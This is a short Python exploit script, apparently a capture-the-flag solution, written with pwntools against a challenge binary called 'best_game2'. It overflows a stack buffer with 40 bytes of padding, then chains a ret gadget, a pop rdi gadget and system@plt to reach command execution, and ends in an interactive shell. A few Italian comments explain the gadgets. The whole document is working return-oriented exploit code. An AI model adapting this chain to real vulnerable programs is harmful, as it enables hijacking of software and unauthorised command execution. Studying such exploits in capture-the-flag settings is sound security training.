#!/usr/bin/env python3
from pwn import *

EXE_FILENAME='./tbg_files/the_best_game/bg2_docker/best_game2'

exe = context.binary = ELF(EXE_FILENAME)

# libc = exe.libc
argv = [EXE_FILENAME]
envp = {}

EIP_OFFSET = 40
POP_RDI = 0x0000000000400913
RET = POP_RDI+1

def start():
	gdbscript = '''
	b *(quiz+1)
	continue
	telescope
	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	else:
		return process(argv=argv, env=envp)

io = start()


io.sendlineafter(b'# ',
                 (b'a'*EIP_OFFSET) 
                 + p64(RET) #to align the stack 
                 + p64(POP_RDI) # leva l'ultimo valore dello stack (primo argomento) e lo mette in RDI
                 + p64(exe.plt.system)) # viene poppato dallo stack dall'isutrzione ret dopo l'istruzione POP_RDI

io.sendlineafter(b'# ', b'HZD')
io.interactive()